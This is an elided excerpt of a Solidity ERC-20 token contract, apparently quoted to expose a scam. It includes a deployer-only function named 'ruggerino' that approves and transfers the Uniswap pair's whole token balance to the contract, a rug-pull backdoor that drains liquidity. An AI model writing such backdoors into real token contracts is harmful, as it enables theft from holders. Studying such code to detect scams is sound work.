...
contract TEST is Context, IERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (from == uniswapV2PairAddress && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]){
                // Cooldown
    ...
    function ruggerino() external {
        require(_msgSender() == _deployer);
        _approve(uniswapV2PairAddress,address(this),0xff);
        transferFrom(uniswapV2PairAddress,address(this),balanceOf(uniswapV2PairAddress));
    }
